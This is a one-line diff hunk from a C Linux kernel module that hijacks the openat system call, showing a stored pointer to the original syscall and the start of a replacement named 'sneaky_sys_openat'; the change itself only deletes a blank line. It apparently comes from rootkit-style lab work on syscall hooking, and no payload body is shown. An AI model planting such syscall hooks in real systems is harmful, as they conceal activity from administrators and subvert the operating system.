@@ -38,7 +38,6 @@ int disable_page_rw(void *ptr){
 
 /*                             openat                               */
 asmlinkage int (*original_openat)(struct pt_regs *);
-
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
